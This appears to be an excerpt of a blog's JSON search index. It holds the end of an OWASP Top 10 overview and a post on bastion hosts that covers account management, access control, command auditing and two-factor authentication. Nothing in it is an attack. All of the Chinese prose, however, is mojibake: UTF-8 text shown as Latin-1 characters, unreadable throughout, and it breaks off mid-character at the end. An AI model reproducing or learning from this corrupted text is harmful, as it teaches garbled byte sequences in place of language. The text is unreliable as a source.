æˆå„ç§æ”»å‡»äº§ç”Ÿä¸¥é‡çš„åæœã€‚ A10 ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§è¿™ä¸ªå’Œç­‰ä¿æœ‰ä¸€å®šçš„å…³ç³»ï¼Œä¸ä½œä»‹ç»ï¼Œä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ï¼Œä»¥åŠäº‹ä»¶å“åº”ç¼ºå¤±æˆ–æ— æ•ˆçš„é›†æˆï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿè¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿã€ä¿æŒæŒç»­æ€§çš„æˆ–æ”»å‡»æ›´å¤šçš„ç³»ç»Ÿï¼Œä»¥åŠå¯¹æ•°æ®çš„ä¸å½“æ“ä½œã€‚ ç»“è¯­ å¤§æ¦‚äº†è§£äº†top 10çš„ç›¸å…³æ¼æ´ï¼Œå¯¹äºæ¼æ´æœ‰äº†ä¸€ä¸ªå¤§æ¦‚çš„è®¤è¯†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å»å¤šå®é™…æ“ä½œï¼Œå»ç†Ÿæ‚‰æ¼æ´çš„ç›¸å…³ç‰¹æ€§ï¼Œæœ‰åŠ©äºæ‚¨æ›´å¥½çš„äº†è§£è¿™äº›æ¼æ´ã€‚ å‚è€ƒæ–‡ç«  OWASP Top 10 2017:https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf ä¸‰åˆ†é’Ÿäº†è§£OWASP TOP 10 2017 RC2: https://www.freebuf.com/news/152207.html æµ…è°ˆOWASP TOP 10:https://www.cnblogs.com/cn-36/p/6723536.html","categories":[],"tags":[],"keywords":[]},{"title":"å ¡å’æœº","slug":"å ¡å’æœº","date":"2018-06-10T08:16:03.000Z","updated":"2020-09-20T08:51:55.037Z","comments":true,"path":"2018/06/10/å ¡å’æœº/","link":"","permalink":"https://zhangyanlady.github.io/2018/06/10/%E5%A0%A1%E5%9E%92%E6%9C%BA/","excerpt":"","text":"ğŸƒå ¡å’æœºåŸç†å…¶ä»åŠŸèƒ½ä¸Šè®²ï¼Œå®ƒç»¼åˆäº†æ ¸å¿ƒç³»ç»Ÿè¿ç»´å’Œå®‰å…¨å®¡è®¡ç®¡æ§ä¸¤å¤§ä¸»å¹²åŠŸèƒ½ï¼Œä»æŠ€æœ¯å®ç°ä¸Šè®²ï¼Œé€šè¿‡åˆ‡æ–­ç»ˆç«¯è®¡ç®—æœºå¯¹ç½‘ç»œå’ŒæœåŠ¡å™¨èµ„æºçš„ç›´æ¥è®¿é—®ï¼Œè€Œé‡‡ç”¨åè®®ä»£ç†çš„æ–¹å¼ï¼Œæ¥ç®¡äº†ç»ˆç«¯è®¡ç®—æœºå¯¹ç½‘ç»œå’ŒæœåŠ¡å™¨çš„è®¿é—®ã€‚å½¢è±¡åœ°è¯´ï¼Œç»ˆç«¯è®¡ç®—æœºå¯¹ç›®æ ‡çš„è®¿é—®ï¼Œå‡éœ€è¦ç»è¿‡è¿ç»´å®‰å…¨å®¡è®¡çš„ç¿»è¯‘ã€‚æ‰“ä¸€ä¸ªæ¯”æ–¹ï¼Œè¿ç»´å®‰å…¨å®¡è®¡æ‰®æ¼”ç€çœ‹é—¨è€…çš„å·¥ä½œï¼Œæ‰€æœ‰å¯¹ç½‘ç»œè®¾å¤‡å’ŒæœåŠ¡å™¨çš„è¯·æ±‚éƒ½è¦ä»è¿™æ‰‡å¤§é—¨ç»è¿‡ã€‚å› æ­¤è¿ç»´å®‰å…¨å®¡è®¡èƒ½å¤Ÿæ‹¦æˆªéæ³•è®¿é—®å’Œæ¶æ„æ”»å‡»ï¼Œå¯¹ä¸åˆæ³•å‘½ä»¤è¿›è¡Œå‘½ä»¤é˜»æ–­ï¼Œè¿‡æ»¤æ‰æ‰€æœ‰å¯¹ç›®æ ‡è®¾å¤‡çš„éæ³•è®¿é—®è¡Œä¸ºï¼Œå¹¶å¯¹å†…éƒ¨äººå‘˜è¯¯æ“ä½œå’Œéæ³•æ“ä½œè¿›è¡Œå®¡è®¡ç›‘æ§ï¼Œä»¥ä¾¿äº‹åè´£ä»»è¿½è¸ªã€‚å®‰å…¨å®¡è®¡ä½œä¸ºä¼ä¸šä¿¡æ¯å®‰å…¨å»ºè®¾ä¸å¯ç¼ºå°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œé€æ¸å—åˆ°ç”¨æˆ·çš„å…³æ³¨ï¼Œæ˜¯ä¼ä¸šå®‰å…¨ä½“ç³»ä¸­çš„é‡è¦ç¯èŠ‚ã€‚åŒæ—¶ï¼Œå®‰å…¨å®¡è®¡æ˜¯äº‹å‰é¢„é˜²ã€äº‹ä¸­é¢„è­¦çš„æœ‰æ•ˆé£é™©æ§åˆ¶æ‰‹æ®µï¼Œä¹Ÿæ˜¯äº‹åè¿½æº¯çš„å¯é è¯æ®æ¥æºã€‚ ğŸŠğŸƒäº§ç”ŸåŸå› ç¼–è¾‘éšç€ä¼äº‹ä¸šå•ä½ITç³»ç»Ÿçš„ä¸æ–­å‘å±•ï¼Œç½‘ç»œè§„æ¨¡å’Œè®¾å¤‡æ•°é‡è¿…é€Ÿæ‰©å¤§ï¼Œæ—¥è¶‹å¤æ‚çš„ITç³»ç»Ÿä¸ä¸åŒèƒŒæ™¯çš„è¿ç»´äººå‘˜çš„è¡Œä¸ºç»™ä¿¡æ¯ç³»ç»Ÿå®‰å…¨å¸¦æ¥è¾ƒå¤§é£é™©ã€‚1.å¤šä¸ªç”¨æˆ·ä½¿ç”¨åŒä¸€ä¸ªè´¦å·ã€‚è¿™ç§æƒ…å†µä¸»è¦å‡ºç°åœ¨åŒä¸€å·¥ä½œç»„ä¸­ï¼Œç”±äºå·¥ä½œéœ€è¦ï¼ŒåŒæ—¶ç³»ç»Ÿç®¡ç†è´¦å·ï¼Œå› æ­¤åªèƒ½å¤šç”¨æˆ·å…±äº«åŒä¸€è´¦å·ã€‚å¦‚æœå‘ç”Ÿå®‰å…¨äº‹æ•…ï¼Œä¸ä»…éš¾ä»¥å®šä½è´¦å·çš„å®é™…ä½¿ç”¨è€…å’Œè´£ä»»äººï¼Œè€Œä¸”æ— æ³•å¯¹è´¦å·çš„ä½¿ç”¨èŒƒå›´è¿›è¡Œæœ‰æ•ˆæ§åˆ¶ï¼Œå­˜åœ¨è¾ƒå¤§å®‰å…¨é£é™©å’Œéšæ‚£ã€‚2.ä¸€ä¸ªç”¨æˆ·ä½¿ç”¨å¤šä¸ªè´¦å·ã€‚ä¸€ä¸ªç»´æŠ¤äººå‘˜ä½¿ç”¨å¤šä¸ªè´¦å·æ˜¯è¾ƒä¸ºæ™®éçš„æƒ…å†µï¼Œç”¨æˆ·éœ€è¦è®°å¿†å¤šå¥—å£ä»¤åŒæ—¶åœ¨å¤šå¥—ä¸»æœºç³»ç»Ÿã€ç½‘ç»œè®¾å¤‡ä¹‹é—´åˆ‡æ¢ï¼Œé™ä½å·¥ä½œæ•ˆç‡ï¼Œå¢åŠ å·¥ä½œå¤æ‚åº¦ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š3. ç¼ºå°‘ç»Ÿä¸€çš„æƒé™ç®¡ç†å¹³å°ï¼Œæƒé™ç®¡ç†æ—¥è¶‹ç¹é‡å’Œæ— åºï¼›è€Œä¸”ç»´æŠ¤äººå‘˜çš„æƒé™å¤§å¤šæ˜¯ç²—æ”¾ç®¡ç†ï¼Œæ— æ³•åŸºäºæœ€å°æƒé™åˆ†é…åŸåˆ™çš„ç”¨æˆ·æƒé™ç®¡ç†ï¼Œéš¾ä»¥å®ç°æ›´ç»†ç²’åº¦çš„å‘½ä»¤çº§æƒé™æ§åˆ¶ï¼Œç³»ç»Ÿå®‰å…¨æ€§æ— æ³•å……åˆ†ä¿è¯ã€‚4. æ— æ³•åˆ¶å®šç»Ÿä¸€çš„è®¿é—®å®¡è®¡ç­–ç•¥ï¼Œå®¡è®¡ç²’åº¦ç²—ã€‚å„ç½‘ç»œè®¾å¤‡ã€ä¸»æœºç³»ç»Ÿã€æ•°æ®åº“æ˜¯åˆ†åˆ«å•ç‹¬å®¡è®¡è®°å½•è®¿é—®è¡Œä¸ºï¼Œç”±äºæ²¡æœ‰ç»Ÿä¸€å®¡è®¡ç­–ç•¥ï¼Œå¹¶ä¸”å„ç³»ç»Ÿè‡ªèº«å®¡è®¡æ—¥å¿—å†…å®¹æ·±æµ…ä¸ä¸€ï¼Œéš¾ä»¥åŠæ—¶é€šè¿‡ç³»ç»Ÿè‡ªèº«å®¡è®¡å‘ç°è¿è§„æ“ä½œè¡Œä¸ºå’Œè¿½æŸ¥å–è¯ã€‚5. ä¼ ç»Ÿçš„ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿæ— æ³•å¯¹ç»´æŠ¤äººå‘˜ç»å¸¸ä½¿ç”¨çš„SSHã€RDPç­‰åŠ å¯†ã€å›¾å½¢æ“ä½œåè®®è¿›è¡Œå†…å®¹å®¡è®¡ã€‚ ğŸƒğŸƒæ ¸å¿ƒåŠŸèƒ½ç™»å½•åŠŸèƒ½ æ”¯æŒå¯¹X11ã€linuxã€unixã€æ•°æ®åº“ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ç­‰ä¸€ç³»åˆ—æˆæƒè´¦å·è¿›è¡Œå¯†ç çš„è‡ªåŠ¨åŒ–å‘¨æœŸæ›´æ”¹ï¼Œç®€åŒ–å¯†ç ç®¡ç†ï¼Œè®©ä½¿ç”¨è€…æ— éœ€è®°å¿†ä¼—å¤šç³»ç»Ÿå¯†ç ï¼Œå³å¯å®ç°è‡ªåŠ¨ç™»å½•ç›®æ ‡è®¾å¤‡ï¼Œä¾¿æ·å®‰å…¨ã€‚ è´¦å·ç®¡ç† è®¾å¤‡æ”¯æŒç»Ÿä¸€è´¦æˆ·ç®¡ç†ç­–ç•¥ï¼Œèƒ½å¤Ÿå®ç°å¯¹æ‰€æœ‰æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ç­‰è´¦å·è¿›è¡Œé›†ä¸­ç®¡ç†ï¼Œå®Œæˆå¯¹è´¦å·æ•´ä¸ªç”Ÿå‘½å‘¨æœŸçš„ç›‘æ§ï¼Œå¹¶ä¸”å¯ä»¥å¯¹è®¾å¤‡è¿›è¡Œç‰¹æ®Šè§’è‰²è®¾ç½®å¦‚ï¼šå®¡è®¡å·¡æ£€å‘˜ã€è¿ç»´æ“ä½œå‘˜ã€è®¾å¤‡ç®¡ç†å‘˜ç­‰è‡ªå®šä¹‰è®¾ç½®ï¼Œä»¥æ»¡è¶³å®¡è®¡éœ€æ±‚ èº«ä»½è®¤è¯ è®¾å¤‡æä¾›ç»Ÿä¸€çš„è®¤è¯æ¥å£ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œæ”¯æŒèº«ä»½è®¤è¯æ¨¡å¼åŒ…æ‹¬ åŠ¨æ€å£ä»¤ã€é™æ€å¯†ç ã€ç¡¬ä»¶key ã€ç”Ÿç‰©ç‰¹å¾ç­‰å¤šç§è®¤è¯æ–¹å¼ï¼Œè®¾å¤‡å…·æœ‰çµæ´»çš„å®šåˆ¶æ¥å£ï¼Œå¯ä»¥ä¸å…¶ä»–ç¬¬ä¸‰æ–¹è®¤è¯æœåŠ¡å™¨ä¹‹é—´ç»“åˆï¼›å®‰å…¨çš„è®¤è¯æ¨¡å¼ï¼Œæœ‰æ•ˆæé«˜äº†è®¤è¯çš„å®‰å…¨æ€§å’Œå¯é æ€§ã€‚ èµ„æºæˆæƒ è®¾å¤‡æä¾›åŸºäºç”¨æˆ·ã€ç›®æ ‡è®¾å¤‡ã€æ—¶é—´ã€åè®®ç±»å‹IPã€è¡Œä¸ºç­‰è¦ç´ å®ç°ç»†ç²’åº¦çš„æ“ä½œæˆæƒï¼Œæœ€å¤§é™åº¦ä¿æŠ¤ç”¨æˆ·èµ„æºçš„å®‰å…¨ è®¿é—®æ§åˆ¶ è®¾å¤‡æ”¯æŒå¯¹ä¸åŒç”¨æˆ·è¿›è¡Œä¸åŒç­–ç•¥çš„åˆ¶å®šï¼Œç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶èƒ½å¤Ÿæœ€å¤§é™åº¦çš„ä¿æŠ¤ç”¨æˆ·èµ„æºçš„å®‰å…¨ï¼Œä¸¥é˜²éæ³•ã€è¶Šæƒè®¿é—®äº‹ä»¶çš„å‘ç”Ÿã€‚ æ“ä½œå®¡è®¡ è®¾å¤‡èƒ½å¤Ÿå¯¹å­—ç¬¦ä¸²ã€å›¾å½¢ã€æ–‡ä»¶ä¼ è¾“ã€æ•°æ®åº“ç­‰å…¨ç¨‹æ“ä½œè¡Œä¸ºå®¡è®¡ï¼›é€šè¿‡è®¾å¤‡å½•åƒæ–¹å¼å®æ—¶ç›‘æ§è¿ç»´äººå‘˜å¯¹æ“ä½œç³»ç»Ÿã€å®‰å…¨è®¾å¤‡ã€ç½‘ç»œè®¾å¤‡ã€æ•°æ®åº“ç­‰è¿›è¡Œçš„å„ç§æ“ä½œï¼Œå¯¹è¿è§„è¡Œä¸ºè¿›è¡Œäº‹ä¸­æ§åˆ¶ã€‚å¯¹ç»ˆç«¯æŒ‡ä»¤ä¿¡æ¯èƒ½å¤Ÿè¿›è¡Œç²¾ç¡®æœç´¢ï¼Œè¿›è¡Œå½•åƒç²¾ç¡®å®šä½ã€‚ ğŸƒç›®æ ‡ä»·å€¼1ã€ ç›®æ ‡ å ¡å’æœºçš„æ ¸å¿ƒæ€è·¯æ˜¯é€»è¾‘ä¸Šå°†äººä¸ç›®æ ‡è®¾å¤‡åˆ†ç¦»ï¼Œå»ºç«‹â€œäºº-ã€‰ä¸»è´¦å·ï¼ˆå ¡å’æœºç”¨æˆ·è´¦å·ï¼‰-ã€‰æˆæƒâ€”&gt;ä»è´¦å·ï¼ˆç›®æ ‡è®¾å¤‡è´¦å·ï¼‰çš„æ¨¡å¼;åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒåŸºäºèº«ä»½æ ‡è¯†ï¼Œé€šè¿‡é›†ä¸­ç®¡æ§å®‰å…¨ç­–ç•¥çš„è´¦å·ç®¡ç†ã€æˆæƒç®¡ç†å’Œå®¡è®¡ï¼Œå»ºç«‹é’ˆå¯¹ç»´æŠ¤äººå‘˜çš„â€œä¸»è´¦å·-ã€‰ç™»å½•â€”ã€‰è®¿é—®æ“ä½œ-ã€‰é€€å‡ºâ€çš„å…¨è¿‡ç¨‹å®Œæ•´å®¡è®¡ç®¡ç†ï¼Œå®ç°å¯¹å„ç§è¿ç»´åŠ å¯†/éåŠ å¯†ã€å›¾å½¢æ“ä½œåè®®çš„å‘½ä»¤çº§å®¡è®¡ã€‚ 2ã€ ç³»ç»Ÿä»·å€¼ å ¡å’æœºçš„ä½œç”¨ä¸»è¦ä½“ç°åœ¨ä¸‹è¿°å‡ ä¸ªæ–¹é¢ï¼š ä¼ä¸šè§’åº¦ é€šè¿‡ç»†ç²’åº¦çš„å®‰å…¨ç®¡æ§ç­–ç•¥ï¼Œä¿è¯ä¼ä¸šçš„æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€æ•°æ®åº“ã€å®‰å…¨è®¾å¤‡ç­‰å®‰å…¨å¯é è¿è¡Œï¼Œé™ä½äººä¸ºå®‰å…¨é£é™©ï¼Œé¿å…å®‰å…¨æŸå¤±ï¼Œä¿éšœä¼ä¸šæ•ˆç›Šã€‚ ç®¡ç†å‘˜è§’åº¦ æ‰€æœ‰è¿ç»´è´¦å·çš„ç®¡ç†åœ¨ä¸€ä¸ªå¹³å°ä¸Šè¿›è¡Œç®¡ç†ï¼Œè´¦å·ç®¡ç†æ›´åŠ ç®€å•æœ‰åºï¼› é€šè¿‡å»ºç«‹ç”¨æˆ·ä¸è´¦å·çš„å¯¹åº”å…³ç³»ï¼Œç¡®ä¿ç”¨æˆ·æ‹¥æœ‰çš„æƒé™æ˜¯å®Œæˆä»»åŠ¡æ‰€éœ€çš„æœ€å°æƒé™ï¼› ç›´è§‚æ–¹ä¾¿çš„ç›‘æ§å„ç§è®¿é—®è¡Œä¸ºï¼Œèƒ½å¤ŸåŠæ—¶å‘ç°è¿è§„æ“ä½œã€æƒé™æ»¥ç”¨ç­‰ã€‚ é‰´äºå¤šè´¦å·åŒæ—¶ä½¿ç”¨è¶…ç®¡è¿›è¡Œçš„æ“ä½œï¼Œä¾¿äºå®ååˆ¶çš„è®¤è¯å’Œè‡ªç„¶äººçš„å…³è”ã€‚ æ™®é€šç”¨æˆ·è§’åº¦ è¿ç»´äººå‘˜åªéœ€è®°å¿†ä¸€ä¸ªè´¦å·å’Œå£ä»¤ï¼Œä¸€æ¬¡ç™»å½•ï¼Œä¾¿å¯å®ç°å¯¹å…¶æ‰€ç»´æŠ¤çš„å¤šå°è®¾å¤‡çš„è®¿é—®ï¼Œæ— é¡»è®°å¿†å¤šä¸ªè´¦å·å’Œå£ä»¤ï¼Œæé«˜äº†å·¥ä½œæ•ˆç‡ï¼Œé™ä½å·¥ä½œå¤æ‚åº¦ã€‚ ğŸƒåº”ç”¨ ä¸€ç§ç”¨äºå•ç‚¹ç™»å½•çš„ä¸»æœºåº”ç”¨ç³»ç»Ÿï¼Œç”µä¿¡ã€ç§»åŠ¨ã€è”é€šä¸‰ä¸ªè¿è¥å•†å¹¿æ³›é‡‡ç”¨å ¡å’æœºæ¥å®Œæˆå•ç‚¹ç™»é™†å’Œè¨ç­æ–¯è¦æ±‚çš„å®¡è®¡ã€‚ åœ¨é“¶è¡Œã€è¯åˆ¸ç­‰é‡‘èä¸šæœºæ„ä¹Ÿå¹¿æ³›é‡‡ç”¨å ¡å’æœºæ¥å®Œæˆå¯¹è´¢åŠ¡ã€ä¼šè®¡æ“ä½œçš„å®¡è®¡ã€‚ åœ¨ç”µåŠ›è¡Œä¸šçš„åŒç½‘æ”¹é€ é¡¹ç›®åï¼Œé‡‡ç”¨å ¡å’æœºæ¥å®ŒæˆåŒç½‘éš”ç¦»ä¹‹åè·¨ç½‘è®¿é—®çš„é—®é¢˜ï¼Œèƒ½å¤Ÿå¾ˆå¥½çš„è§£å†³åŒç½‘ä¹‹é—´çš„è®¿é—®çš„å®‰å…¨é—®é¢˜ã€‚ ğŸ§§ç‰¹ç‚¹å®¡è®¡åè®®èŒƒå›´ å¹³å°é‡‡ç”¨åè®®åˆ†æã€åŸºäºæ•°æ®åŒ…è¿˜åŸè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ç°æ“ä½œç•Œé¢æ¨¡æ‹Ÿï¼Œå°†æ‰€æœ‰çš„æ“ä½œè½¬æ¢ä¸ºå›¾å½¢åŒ–ç•Œé¢äºˆä»¥å±•ç°ï¼Œå®ç°100%å®¡è®¡ä¿¡æ¯ä¸ä¸¢å¤±ï¼šé’ˆå¯¹è¿ç»´æ“ä½œå›¾å½¢åŒ–å®¡è®¡åŠŸèƒ½çš„å±•ç°å¤–ï¼ŒåŒæ—¶è¿˜èƒ½å¯¹å­—ç¬¦è¿›è¡Œåˆ†æï¼ŒåŒ…æ‹¬å‘½ä»¤è¡Œæ“ä½œçš„å‘½ä»¤ä»¥åŠå›æ˜¾ä¿¡æ¯å’Œéå­—ç¬¦å‹æ“ä½œæ—¶é”®ç›˜ã€é¼ æ ‡çš„æ•²å‡»ä¿¡æ¯ã€‚ ç³»ç»Ÿæ”¯æŒçš„å®¡è®¡åè®®ä»¥åŠå·¥å…·åŒ…æ‹¬ï¼š å­—ç¬¦ä¸²æ“ä½œï¼šSSH/Telnetï¼ˆå·¥å…·ï¼šSecureCRT/Putty/Xshellï¼‰ å›¾å½¢æ“ä½œï¼š RDP/VNC/X11/pcAnywhere/DameWareç­‰ å…¶ä»–åè®®ï¼š FTP/SFTP/Http/Httpsç­‰ æ•°æ®åº“å·¥å…·:Oracle/sqlserver/Mysqlå®¢æˆ·ç«¯å·¥å…· åè®®åŠå·¥å…· å­—ç¬¦ä¸²æ“ä½œï¼šSSH/Telnet ï¼ˆå·¥å…·ï¼šSecureCRT/Putty/Xshellï¼‰ å›¾å½¢æ“ä½œï¼š RDP/VNC/X11/pcAnywhere/DameWareç­‰ å…¶ä»–åè®®ï¼šFTP/SFTP/Http/Https/SQLPLUSç­‰ æŠ¥è¡¨ç®¡ç† å¹³å°å…·æœ‰ä¸°å¯Œçš„æŠ¥è¡¨ç»Ÿè®¡åŠŸèƒ½ï¼Œå¯ä»¥è¿›è¡Œé»˜è®¤æŠ¥è¡¨å’Œè‡ªå®šä¹‰æŠ¥è¡¨æ¥è¿›è¡Œè¿ç»´æ•°æ®çš„æŠ¥è¡¨ç»Ÿè®¡ã€‚ å¹³å°æä¾›å¤šç§æŠ¥è¡¨æ ¼å¼ï¼ŒåŒ…æ‹¬Wordã€Excelç­‰ã€‚ å¹³å°æä¾›æŠ˜çº¿ã€é¥¼çŠ¶ã€æŸ±çŠ¶ç­‰å¤šç§å›¾è¡¨ç»Ÿè®¡è¿ç»´æ•°æ®ï¼Œæ–¹ä¾¿åæœŸçš„è¿ç»´åˆ†æå’Œç®¡ç†ã€‚ å®Œå–„ç®¡ç†æƒé™ å¹³å°å¯¹ç”¨æˆ·çš„ç®¡ç†æƒé™ä¸¥æ ¼åˆ†æ˜ï¼Œå„å¸å…¶èŒï¼Œåˆ†ä¸ºç³»ç»Ÿç®¡ç†å‘˜ã€å®¡è®¡ç®¡ç†å‘˜ã€è¿ç»´ç®¡ç†å‘˜ã€å£ä»¤ç®¡ç†å‘˜å››ç§ç®¡ç†å‘˜è§’è‰²ï¼Œå¹³å°ä¹Ÿæ”¯æŒç®¡ç†å‘˜è§’è‰²çš„è‡ªå®šä¹‰åˆ›å»ºï¼Œå¯¹ç®¡ç†æƒé™è¿›è¡Œç»†ç²’åº¦è®¾ç½®ï¼Œä¿éšœäº†å¹³å°çš„ç”¨æˆ·å®‰å…¨ç®¡ç†ï¼Œä»¥æ»¡è¶³å®¡è®¡éœ€æ±‚ å¹³å°é›†ç”¨æˆ·ç®¡ç†ã€èº«ä»½è®¤è¯ã€èµ„æºæˆæƒã€è®¿é—®æ§åˆ¶ã€æ“ä½œå®¡è®¡ä¸ºä¸€ä½“ï¼Œæœ‰æ•ˆåœ°å®ç°äº†äº‹å‰é¢„é˜²ã€äº‹ä¸­æ§åˆ¶å’Œäº‹åå®¡è®¡ã€‚ å¤„ç†èƒ½åŠ› å®¡è®¡å¹³å°èƒ½å¤Ÿå¯¹å¸¸è§çš„SSH/Telnet/FTP/SFTP/HTTP/HTTPS /Windows Terminal/X11ã€VNCåè®®è¿›è¡Œå®Œæ•´çš„é€æ˜è½¬å‘ï¼Œé’ˆå¯¹å¦‚RDP/VNC/X11ç­‰å›¾å½¢åŒ–åè®®çš„å¤„ç†èƒ½åŠ›è¦æ¯”åŒç±»äº§å“å¤„ç†èƒ½åŠ›å¼ºã€‚ æ€§èƒ½ å¹³å°é‡‡ç”¨æ¨¡å—åŒ–è®¾è®¡ï¼Œå•æ¨¡å—æ•…éšœä¸å½±å“å…¶ä»–æ¨¡å—ä½¿ç”¨ï¼Œä»è€Œæé«˜äº†å¹³å°çš„å¥å£®æ€§ã€ç¨³å®šæ€§ è¿ç»´äººå‘˜ç™»é™†å¯æ”¯æŒPortalç»Ÿä¸€ç™»å½•ï¼Œå¹¶å…¼å®¹ç»ˆç«¯C/Så®¢æˆ·ç«¯è¿æ¥è®¾å¤‡ï¼› å®¡è®¡å¹³å°çš„è®¤è¯æ–¹å¼å¯ä»¥ä¸ç¬¬ä¸‰æ–¹çš„è®¤è¯è®¾å¤‡è¿›è¡Œå®šåˆ¶å…¼å®¹ å…·æœ‰å¼ºå¤§ç ”å‘å®åŠ›ï¼Œä¸ä½†èƒ½ä¸ºå®¢æˆ·æä¾›é•¿æœŸçš„äº§å“æ›´æ–°ï¼Œè¿˜èƒ½æŒ‰ç…§å®¢æˆ·çš„å®é™…éœ€æ±‚è¿›è¡Œå®šåˆ¶å¼€å‘ã€‚ éƒ¨ç½²æ–¹å¼ å ¡å’æœºæä¾›äº†åŠŸèƒ½å®Œå–„ã€æ“ä½œçµæ´»ã€ä½¿ç”¨æ–¹ä¾¿ã€ç•Œé¢å‹å¥½ã€ç¬¦åˆä¹ æƒ¯çš„å®¡è®¡ç®¡ç†åŠŸèƒ½ï¼› B/Sæ–¹å¼å®ç°äº†å¯¹åå°çš„å„é¡¹ç®¡ç†é…ç½® å¹³å°ç®€å•æ˜“éƒ¨ç½²ï¼Œé€šè¿‡é…ç½®å¯¼èˆªï¼Œå¯åœ¨çŸ­æ—¶é—´å†…å®Œæˆé…ç½®è¦æ±‚ï¼Œå®ç°ä¸Šçº¿è¦æ±‚ã€‚ ç³»ç»Ÿå®‰å…¨ åŸºäºHTTPS/SSLçš„è‡ªèº«å®‰å…¨ç®¡ç†ä¸å®¡è®¡ï¼› ä¸¥æ ¼çš„å®‰å…¨è®¿é—®æ§åˆ¶å’Œç®¡ç†å‘˜èº«ä»½è®¤è¯æ”¯æŒå¼ºè®¤è¯ï¼› å®¡è®¡ä¿¡æ¯åŠ å¯†å­˜å‚¨ï¼› å®Œå–„çš„å®¡è®¡ä¿¡æ¯å¤‡ä»½æœºåˆ¶ï¼› å®Œæ•´å…¨é¢çš„è‡ªå®¡è®¡åŠŸèƒ½ã€‚ ğŸ‡å ¡å’æœºæ³¨æ„äº‹é¡¹åŸåˆ™1ï¼šå ¡å’æœºçš„è´¦å·ç®¡ç†ä¼ä¸šç®¡ç†äººå‘˜ä¸ºäº†æ–¹ä¾¿ç™»é™†ï¼Œç»å¸¸ä¼šå‡ºç°å¤šä¸ªç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªè´¦å·æˆ–ä¸€ä¸ªç”¨æˆ·ä½¿ç”¨å¤šä¸ªè´¦å·çš„æƒ…å†µã€‚ç”±äºå…±äº«è´¦å·æ˜¯å¤šäººå…±åŒä½¿ç”¨ï¼Œå½“ç³»ç»Ÿå‘ç”Ÿé—®é¢˜åï¼Œæ— æ³•ç²¾ç¡®å®šä½æ¶æ„æ“ä½œæˆ–è¯¯æ“ä½œçš„å…·ä½“è´£ä»»äººã€‚å› æ­¤åœ¨æ­å»ºå ¡å’æœºæ—¶ï¼Œä¸€å®šè¦æ³¨æ„å¿…é¡»åšåˆ°ä¸€äººä¸€ä¸ªå¸å·ï¼Œç»ä¸å…è®¸å¤šä¸ªäººå…±ç”¨ä¸ªäººå¸å·ï¼Œæ›´ä¸èƒ½å…è®¸å…±åŒè´¦å·ç™»å½•å ¡å’æœºã€‚ åŸåˆ™2ï¼šå ¡å’æœºçš„è®¿é—®æ§åˆ¶è®¿é—®æ§åˆ¶çš„ç›®çš„æ˜¯é€šè¿‡é™åˆ¶ç»´æŠ¤äººå‘˜å¯¹æ•°æ®ä¿¡æ¯çš„è®¿é—®èƒ½åŠ›åŠèŒƒå›´ï¼Œä¿è¯ä¿¡æ¯èµ„æºä¸è¢«éæ³•ä½¿ç”¨å’Œè®¿é—®ã€‚ åŸåˆ™3ï¼šå ¡å’æœºçš„æŒ‡ä»¤å®¡æ ¸å ¡å’æœºçš„æ“ä½œå®¡è®¡åŠŸèƒ½ä¸»è¦å®¡è®¡è¿ç»´äººå‘˜çš„è´¦å·ä½¿ç”¨ï¼ˆç™»å½•ã€èµ„æºè®¿é—®ï¼‰æƒ…å†µã€èµ„æºä½¿ç”¨æƒ…å†µç­‰ï¼Œé’ˆå¯¹æ•æ„ŸæŒ‡ä»¤ï¼Œå ¡å’æœºå¯ä»¥è¿›è¡Œé˜»æ–­å“åº”æˆ–è§¦å‘å®¡æ ¸æ“ä½œï¼Œå®¡æ ¸ä¸é€šè¿‡çš„æ•æ„ŸæŒ‡ä»¤ï¼Œå ¡å’æœºå°†ä¼šè¿›è¡Œæ‹¦æˆªã€‚ åŸåˆ™4ï¼šå ¡å’æœºçš„èº«ä»½è®¤è¯æœç»ä»…ä½¿ç”¨å¯†ç ç™»å½•å ¡å’æœºï¼Œå»ºè®®åœ¨æ‰§è¡Œä¸»æœºé‡å¯ã€å¯†ç ä¿®æ”¹ã€ä¼šè¯åˆ›å»ºã€å¿«ç…§å›æ»šã€ç£ç›˜æ›´æ¢ç­‰å„ç§é‡è¦æ“ä½œæ—¶ï¼Œå¯é€šè¿‡å¾®ä¿¡æˆ–çŸ­ä¿¡ç­‰è¿›è¡ŒåŒå› å­èº«ä»½ç¡®è®¤ï¼Œç¡®ä¿è®¿é—®è€…èº«ä»½çš„åˆæ³•æ€§ã€‚ åŸåˆ™5ï¼šå ¡å’æœºçš„èµ„æºæˆæƒç”¨æˆ·æˆæƒï¼Œå»ºè®®ç»“åˆå…¬å¸å†…éƒ¨CMDBæ¥åšåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶æ¨¡å‹ä»¥å®ç°æƒé™æ§åˆ¶ã€‚é€šè¿‡é›†ä¸­è®¿é—®æ§åˆ¶å’Œç»†ç²’åº¦çš„å‘½ä»¤çº§æˆæƒç­–ç•¥ï¼ŒåŸºäºæœ€å°æƒé™åŸåˆ™ï¼Œå®ç°é›†ä¸­æœ‰åºçš„è¿ç»´æ“ä½œç®¡ç†ã€‚ åŸåˆ™6ï¼šå ¡å’æœºçš„å®¡è®¡å½•åƒåœ¨å®‰å…¨å±‚é¢ï¼Œé™¤äº†é€šè¿‡å ¡å’æœºçš„äº‹å‰æƒé™æˆæƒã€äº‹ä¸­æ•æ„ŸæŒ‡ä»¤æ‹¦æˆªå¤–ï¼Œè¿˜éœ€æä¾›å 